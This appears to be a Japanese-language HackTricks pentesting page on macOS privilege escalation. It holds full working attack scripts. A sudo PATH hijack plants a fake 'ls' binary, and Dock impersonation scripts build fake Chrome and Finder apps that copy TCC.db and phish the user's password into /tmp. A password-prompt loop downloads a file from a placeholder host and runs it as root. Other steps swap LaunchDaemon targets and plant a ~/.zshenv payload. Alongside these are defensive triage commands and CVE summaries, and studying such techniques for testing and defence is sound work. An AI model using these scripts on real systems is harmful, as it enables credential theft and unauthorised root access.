# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation を探している場合は、こちらへ移動してください:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Linux やその他の Unix 系システムに影響する多くの privilege-escalation technique は、macOS にも適用できます。以下を参照してください:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

元の [Sudo Hijacking technique は Linux Privilege Escalation の記事](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)にあります。

ただし、macOS はユーザーが **`sudo`** を実行するとき、ユーザーの **`PATH`** を**維持します**。つまり、この攻撃を実現する別の方法は、被害者が **sudo を実行するときに:** 実行する他のバイナリを **hijack する**ことです。
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
ターミナルを使用するユーザーは、**Homebrewをインストールしている可能性が非常に高い**ことに注意してください。そのため、**`/opt/homebrew/bin`** 内のバイナリをハイジャックすることが可能です。

### Dock Impersonation

**ソーシャルエンジニアリング**を利用して、Dock内で例えばGoogle Chromeに**なりすまし**、実際には自分のスクリプトを実行させることができます。

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
いくつかの提案：

- DockにChromeがあるか確認し、ある場合はそのエントリを**削除**して、Dock配列内の**同じ位置**に**偽の** **Chromeエントリ**を**追加**します。

<details>
<summary>Chrome Dockなりすましスクリプト</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
いくつかの提案：

- **FinderをDockから削除することはできない**ため、Dockに追加する場合は、偽のFinderを本物のFinderのすぐ隣に配置できます。そのためには、**Dock配列の先頭に偽のFinderエントリを追加する**必要があります。
- 別の方法として、Dockに配置せずにそのまま開くこともできます。「FinderがFinderの制御を求めています」という表示は、それほど不自然ではありません。
- 不自然なダイアログを表示して**パスワードを尋ねずにrootへescalateする**別の方法は、特権アクションを実行するためにFinderが実際にパスワードを尋ねるようにすることです：
- Finderに新しい**`sudo`**ファイルを**`/etc/pam.d`**へコピーさせる（パスワードを尋ねるプロンプトには「Finderがsudoをコピーしようとしています」と表示されます）
- 新しい**Authorization Plugin**をコピーさせる（ファイル名を制御できるため、パスワードを尋ねるプロンプトには「FinderがFinder.bundleをコピーしようとしています」と表示されます）

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

マルウェアは、ユーザーの操作を悪用して **sudo-capable password** を取得し、プログラムから再利用することがよくあります。一般的なフロー:

1. `whoami` でログイン中のユーザーを特定する。
2. `dscl . -authonly "$user" "$pw"` が成功を返すまで **password prompts** をループする。
3. credential（例: `/tmp/.pass`）を cache し、`sudo -S`（stdin 経由の password）で privileged actions を実行する。

最小限の chain の例:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
盗み出したパスワードは、**`xattr -c` で Gatekeeper の quarantine を解除**したり、LaunchDaemons などの特権ファイルをコピーしたり、追加のステージを非対話的に実行したりするために再利用できます。<sup>[[1]](#references)</sup>

## より新しい macOS 固有のベクトル（2023–2026）

### 非推奨の `AuthorizationExecuteWithPrivileges` も依然として利用可能

`AuthorizationExecuteWithPrivileges` は 10.7 で非推奨になりましたが、**Sonoma/Sequoia でも依然として動作します**。多くの commercial updater は、信頼できないパスを指定して `/usr/libexec/security_authtrampoline` を呼び出します。対象の binary が user-writable であれば、trojan を仕込み、正規の認証プロンプトに便乗できます。
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
**masquerading tricks above** と組み合わせて、信頼できそうな password dialog を表示します。


### Privileged helper / XPC triage

現代の多くのサードパーティ製 macOS privescs は、同じパターンに従います。**root LaunchDaemon** が **`/Library/PrivilegedHelperTools`** から **Mach/XPC service** を公開し、その後、helper が **client を検証しない**、**検証が遅すぎる**（PID race）、または **user-controlled path/script** を受け取る **root method** を公開します。これは、VPN client、game launcher、updater で近年発見された多くの helper bugs の背後にある bug class です。<sup>[[2]](#references)</sup>

Quick triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
特に、以下の特徴を持つヘルパーに注意してください。

- ジョブが `launchd` にロードされたままになっているため、**アンインストール後も**リクエストの受け付けを続ける
- **`/Applications/...`** または非 root ユーザーが書き込み可能なその他のパスからスクリプトを実行したり、設定を読み込んだりする
- raceable になり得る **PID-based** または **bundle-id-only** の peer validation に依存する

helper authorization bugs の詳細については、[this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)を確認してください。

### PackageKit script environment inheritance (CVE-2024-27822)

Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、**`Installer.app`** / **`PackageKit.framework`** を介してユーザーが開始したインストールでは、**PKG scripts を現在のユーザー環境内で root として実行**できました。つまり、**`#!/bin/zsh`** を使用するパッケージは、攻撃者の **`~/.zshenv`** を読み込み、被害者がそのパッケージをインストールした際に、それを **root** として実行できました。<sup>[[3]](#references)</sup>

これは **logic bomb** として特に興味深いものです。ユーザーアカウントへの foothold と、書き込み可能な shell startup file だけを確保し、その後、脆弱な **zsh-based** installer がユーザーによって実行されるのを待てばよいのです。これは通常、**MDM/Munki** deployments には適用されません。これらは root ユーザーの環境内で実行されるためです。<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
深く installer 固有の abuse を調べたい場合は、[こちらのページ](macos-files-folders-and-binaries/macos-installers-abuse.md)も確認してください。

### `.localized` による Installer の配置先 collision

一部の third-party installer は、実行ファイルが `/Applications/Target.app` 内の固定パスで参照される root LaunchDaemon を登録します。攻撃者が、**異なる bundle identifier** を使用してその bundle を先に作成できる場合、Installer は decoy を保持し、実際の app を `/Applications/Target.localized/Target.app` に配置することがあります。daemon は引き続き元のパスを参照します。そのため、decoy bundle 内の攻撃者が制御する実行ファイルが、後から root として実行される可能性があります。<sup>[[8]](#references)</sup>

重要な前提条件は次のとおりです。<sup>[[8]](#references)</sup>

1. 攻撃者が、想定される application path を作成または制御できる。
2. package が競合する bundle を削除しない。
3. privileged job が、その bundle 内の hard-coded path を使用する。
4. ユーザーまたは MDM workflow が package をインストールし、job を登録する。

移動された bundle を探し、次のセクションの enumeration loop を使って LaunchDaemon の target を確認してください。<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
より安全なインストーラは最終的な bundle の場所を解決し、特権実行ファイルを `/Library/PrivilegedHelperTools` のような root 所有の場所に保持します。また、job を登録または開始する前に、所有者と code signing も検証する必要があります。<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

LaunchDaemon の plist は root 所有でも、`Program` または最初の `ProgramArguments` エントリがユーザーによる書き込み可能なディレクトリを指している場合があります。実行ファイルの mode だけでなく、**パス全体**を確認してください。親ディレクトリが書き込み可能な場合、攻撃者は root 所有の実行ファイルを rename し、同じパスに replacement を作成できます。次回 job が開始されると、replacement が root として実行されます。reboot または通常の service restart だけで十分です。攻撃者は system domain で `launchctl bootstrap` を実行する権限を必要としません。<sup>[[7]](#references)</sup>

まず各 target とその直上の親を列挙します。<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
ファイルまたはその親ディレクトリが書き込み可能な場合は、元のバイナリを保存し、そのパスを実行可能なペイロードに置き換えます。その後、すでにロードされている daemon が再起動するのを待ちます。<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

脆弱な `kauth_cred_proc_update` のパスは、SMR reader がロックなしでポインターを読み込んでいる間に、非 atomic な `zalloc_ro_mut` API を使用して `proc_ro.p_ucred` を更新していました。公開されている trigger は、特別に準備された setgid binary を使用します。一方の thread が real group ID と effective group ID を切り替える間、もう一方の thread は `getgid()` などの syscall に繰り返し入ります。<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
これは完成済みの root exploit ではなく、**race primitive** として扱ってください。公開された PoC は、分割された credential pointer を実証するものです。多くの場合、kernel panic で終了します。研究者が corruption を再現できたのは Intel 上のみで、結果として生成される credential object を決定論的に制御できることは示していません。Apple は macOS 15.3 で、更新処理を atomic pointer exchange に変更しました。<sup>[[4]](#references)</sup>

### Migration assistant 経由の SIP bypass（"Migraine"、CVE-2023-32369）

すでに root を取得していても、SIP は system locations への書き込みをブロックします。**Migraine** bug は、Migration Assistant の entitlement `com.apple.rootless.install.heritable` を悪用して、SIP bypass を継承する child process を起動し、保護された path（例: `/System/Library/LaunchDaemons`）を上書きします。<sup>[[5]](#references)</sup> Chain は次のとおりです。

1. 稼働中の system 上で root を取得する。
2. 細工した state により `systemmigrationd` を trigger し、attacker-controlled binary を実行させる。
3. 継承した entitlement を使用して SIP-protected files に patch を適用し、reboot 後も persistence を維持する。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）

複数の Apple daemons は XPC 経由で **NSPredicate** objects を受け取り、attacker-controlled な `expressionType` field のみを validation しています。任意の selectors を評価する predicate を作成することで、**root/system XPC services**（例: `coreduetd`、`contextstored`）で **code execution** を達成できます。initial app sandbox escape と組み合わせると、**user prompts なしの privilege escalation** が可能になります。predicates を deserialize する一方で、robust visitor を備えていない XPC endpoints を探してください。<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user**（unprivileged user であっても）は、`-o noowners` を指定して Time Machine snapshot を作成・mount し、その snapshot 内の**すべての files に access**できます。これにより、live volume 上の ownership checks を bypass できます。必要な privilege は、使用する application（`Terminal` など）に **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）が付与されていることだけです。

Commands と完全な説明は TCC bypasses page にあります。

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

これは privilege escalation に役立つ場合があります。


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - Infostealer の年、2025 年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS および iOS における新たな Privilege Escalation Bug Class（CVE-2023-23530/23531）](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: insecure folder permissions による privilege escalation と persistence](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE via the .localized directory](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
